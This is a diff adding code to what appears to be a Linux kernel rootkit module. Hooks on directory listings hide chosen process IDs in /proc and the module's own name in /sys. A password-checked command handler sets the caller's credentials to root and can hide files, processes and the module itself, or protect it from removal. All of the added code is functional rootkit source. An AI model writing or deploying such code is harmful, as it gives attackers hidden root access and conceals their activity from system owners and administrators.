@@ -544,3 +544,94 @@ READDIR_HOOK_START(root)
         }
     }
 READDIR_HOOK_END(root)
+
+READDIR_HOOK_START(proc)
+    struct pid_entry *p;
+
+    list_for_each_entry(p, *pid_list, list) {
+        if (simple_strtoul(name, NULL, 10) == p-> pid) {
+            return 0;
+        }
+    }
+
+READDIR_HOOK_END(proc)
+
+READDIR_HOOK_START(sys)
+    if (is_hidden && strcmp(name, KBUILD_MODNAME) == 0) {
+        return 0;
+    }
+READDIR_HOOK_END(sys)
+
+#undef FILLDIR_START
+#undef FILLDIR_END
+#undef READDIR
+#undef READDIR_HOOK_START
+#undef READDIR_HOOK_END
+
+int execute_command(const char __user *str, size_t length)
+{
+    if (length <= sizeof(CFG_PASS) ||
+        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0) {
+        return 0;
+    }
+
+    pr_info("Password check passed\n");
+
+    // since the password matched, we assume the command following the password
+    // is in the valid format
+
+    str += sizeof(CFG_PASS);
+
+    if (strcmp(str, CFG_ROOT) == 0) {
+        pr_info("Got root command\n");
+        struct cred *creds = prepare_creds();
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
+
+        creds->uid.val = creds->euid.val = 0;
+        creds->gid.val = creds->egid.val = 0;
+
+#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
+
+        creds->uid = creds->euid = 0;
+        creds->gid = creds->egid = 0;
+
+#endif
+
+        commit_creds(creds);
+    } else if (strcmp(str, CFG_HIDE_PID) == 0) {
+        pr_info("Got hide pid command\n");
+        str += sizeof(CFG_HIDE_PID);
+        pid_add(str);
+    } else if (strcmp(str, CFG_UNHIDE_PID) == 0) {
+        pr_info("Got unhide pid command\n");
+        str += sizeof(CFG_UNHIDE_PID);
+        pid_remove(str);
+    } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
+        pr_info("Got hide file command\n");
+        str += sizeof(CFG_HIDE_FILE);
+        file_add(str);
+    } else if (strcmp(str, CFG_UNHIDE_FILE) == 0) {
+        pr_info("Got unhide file command\n");
+        str += sizeof(CFG_UNHIDE_FILE);
+        file_remove(str);
+    }  else if (strcmp(str, CFG_HIDE) == 0) {
+        pr_info("Got hide command\n");
+        hide();
+    } else if (strcmp(str, CFG_UNHIDE) == 0) {
+        pr_info("Got unhide command\n");
+        unhide();
+    } else if (strcmp(str, CFG_PROTECT) == 0) {
+        pr_info("Got protect command\n");
+        protect();
+    } else if (strcmp(str, CFG_UNPROTECT) == 0) {
+        pr_info("Got unprotect command\n");
+        unprotect();
+    } else {
+        pr_info("Got unknown command\n");
+    }
+
+    return 1;
+}
+
